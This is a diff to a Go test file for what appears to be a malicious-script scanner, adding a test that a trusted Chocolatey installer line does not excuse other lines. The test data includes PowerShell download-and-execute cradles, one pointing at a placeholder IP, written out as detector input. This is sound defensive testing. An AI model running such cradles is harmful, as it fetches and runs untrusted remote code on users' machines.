@@ -235,6 +235,20 @@ func TestScriptQuiet(t *testing.T) {
 	}
 }
 
+// An exception must not excuse a whole file, or naming a trusted installer in a
+// comment would hide the real cradle below it.
+func TestTrustedInstallerExcusesOnlyItsLine(t *testing.T) {
+	src := "iex (irm https://community.chocolatey.org/install.ps1)\niex (irm http://192.0.2.1/x)\n"
+	if r := Analyze([]byte(src), Options{}); !has(r, classDownloadExec) {
+		t.Fatalf("the second line must still fire: %+v", r.Findings)
+	}
+	// A package on the same host is not the installer.
+	pkg := "iex (irm https://community.chocolatey.org/api/v2/package/stranger)\n"
+	if r := Analyze([]byte(pkg), Options{}); !has(r, classDownloadExec) {
+		t.Fatalf("only the exact path is trusted: %+v", r.Findings)
+	}
+}
+
 func TestPHPTaintIgnoresUntaintedSink(t *testing.T) {
 	src := "<?php\n$q = $_GET['q'];\n$cmd = 'uptime';\nsystem($cmd);\necho $q;\n"
 	if r := Analyze([]byte(src), Options{}); has(r, classPHPTaintExec) {
@@ -339,7 +353,7 @@ func TestCarrierWithBenignTable(t *testing.T) {
 }
 
 func TestParseNumbersRejectsWideTables(t *testing.T) {
-	if parseNumbers("1, 2, 300") != nil {
+	if parseNumbers("1, 2, 300", 1<<20) != nil {
 		t.Fatal("a list with an element over 255 is not a byte array")
 	}
 }
